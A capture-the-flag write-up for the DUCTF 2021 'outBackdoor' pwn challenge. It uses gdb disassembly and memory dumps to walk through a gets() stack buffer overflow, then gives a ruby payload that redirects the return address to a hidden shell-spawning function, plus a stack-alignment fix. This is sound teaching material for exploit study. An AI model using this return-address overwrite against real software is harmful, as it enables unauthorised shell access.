___
# outBackdoor
_(pwn, easy, 100 points, 361 solves)_

Fool me once, shame on you. Fool me twice, shame on me.

Author: xXl33t_h@x0rXx

`nc pwn-2021.duc.tf 31921`

[outBackdoor](./outBackdoor)
___

## Investigation
`checksec` showed that besides NX no other stack mitigations are present, especially no PIE. Following the `ltrace` I learned the relatively simple flow of the program and found
a potential buffer overflow vulnerability because the insecure `gets` functions is used to capture user input. I loaded the program into `gdb` and found - next
to the `main` function - another interesting function called `outBackdoor`.

```
(gdb) info functions
...
0x0000000000401195  main
0x00000000004011d7  outBackdoor
...
```

```
(gdb) disas outBackdoor
...
0x00000000004011e7 <+16>:	lea    rdi,[rip+0xedf]        # 0x4020cd  "/bin/sh"
0x00000000004011ee <+23>:	mov    eax,0x0
0x00000000004011f3 <+28>:	call   0x401050 <system@plt>
...
```

```
(gdb) disas main
...
0x00000000004011bf <+42>:	lea    rax,[rbp-0x10]
0x00000000004011c3 <+46>:	mov    rdi,rax
0x00000000004011c6 <+49>:	mov    eax,0x0
0x00000000004011cb <+54>:	call   0x401060 <gets@plt>
...
```

The disassembly of the functions reveals we can get a shell from `outBackdoor` - if we are able to call it, as it isn't called from anywhere in `main`.
So the goal is to overflow the buffer in the `main` function and overwrite the return address with the address of the `outBackdoor` function. Let's set
a breakpoint right after the `gets` and run the program with `AAAAAAAA` as input.

```
(gdb) r
...
Breakpoint 1, 0x00000000004011d0 in main ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffdee0:
 rip = 0x4011d0 in main; saved rip = 0x7ffff7e0cb75
 Arglist at 0x7fffffffded0, args: 
 Locals at 0x7fffffffded0, Previous frame's sp is 0x7fffffffdee0
 Saved registers:
  rbp at 0x7fffffffded0, rip at 0x7fffffffded8
(gdb) x/10x $rbp-0x10
0x7fffffffdec0:	0x41414141	0x41414141	0x00000000	0x00000000
0x7fffffffded0:	0x00000000	0x00000000	0xf7e0cb75	0x00007fff
0x7fffffffdee0:	0xffffdfc8	0x00007fff
```

We see that the buffer at `rbp-0x10` which is at `0x7fffffffdec0` itself takes 16 bytes of which we filled 8 bytes with the `AAAAAAAA`'s we typed in.
Then follows the `rbp` at `0x7fffffffded0`. On a 64-bit system this address takes another 8 bytes and directly after follows the `main` function's return
address we want to overwrite with the address of `outBackdoor` which is `0x00000000004011d7` - lucky for us the binary isn't PIE enabled.  

So we can just
- fill the buffer at `rbp-0x10` with 16 bytes
- overwrite `rbp` with 8 bytes
- overwrite the return address of `main` with `0x00000000004011d7` making `rip` point to `outBackdoor`.

## Solution
Let's pull off a quick ruby exploit for proof of concept.

```
(gdb) r < <(ruby -e 'print "A"*16 + "B"*8 + "\xd7\x11\x40\x00\x00\x00\x00\x00"')
...
Breakpoint 1, 0x00000000004011d0 in main ()
(gdb) x/10x $rbp-0x10
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x42424242	0x42424242	0x004011d7	0x00000000
0x7fffffffdee0:	0xffffdf00	0x00007fff
(gdb) c
Continuing.


W...w...Wait? Who put this backdoor out back here?
```
___
##### Note
When running the exploit remotely the program segfaults because of the so called [movaps issue](https://ropemporium.com/guide.html).
`movaps` is an assembly instruction that is used in some syscalls like `do_system()` and it expects the stack to be 16-byte aligned. Because we just brutally overwrote the return address of `main` instead of using a clean `call outBackdoor` our stack at the point of calling into `system()` is not aligned correctly.
To deal with that I used the address of `outBackdoor + 1` in the exploit instead - skipping the first `push rbp` instruction and therefore keeping the stack alignment intact.
___

See [exploit](./exploit.py) for an automation of the exploit written in python.

> DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
